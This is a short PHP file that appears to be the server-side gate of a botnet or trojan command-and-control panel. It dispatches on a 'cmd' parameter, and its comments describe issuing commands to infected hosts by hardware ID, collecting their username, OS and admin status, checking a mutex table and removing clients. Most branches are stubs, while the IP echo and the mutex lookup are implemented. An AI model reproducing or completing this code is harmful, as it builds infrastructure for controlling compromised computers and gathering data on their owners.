<?php error_reporting (E_ALL ^ E_NOTICE); ?>

<?php
include("config.php");

if ($_GET['cmd'] =="0")
	echo "Zero"; //Get Latest Command Need to get the HWID
elseif ($_GET['cmd'] =="1")
	echo "One"; //Send back information on last command
elseif ($_GET['cmd'] =="2")
	echo $_SERVER['REMOTE_ADDR']; //Get IP
elseif ($_GET['cmd'] =="3")
	getMutex(); //Check Mutex database
elseif ($_GET['cmd'] =="4")
	echo "Four"; //Send Client Information Need to get HWID (Username, OS, Admin Status, Ect...)
elseif ($_GET['cmd'] =="5")
	echo "Five"; //Deletes Client from DB Need to get HWID
else
	echo "Error";
  
  function getMutex() 
{ 
	$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	if ($mysqli->connect_error) {
    	die('Error : ('. $mysqli->connect_errno .') '. $mysqli->connect_error);
	}
	$results = $mysqli->query("SELECT mutex_id, mutex_code FROM mutex");
	while($row = $results->fetch_assoc())
	{
		echo $row['mutex_code'] . "|";
	}
   $mysqli->close();
} 
?>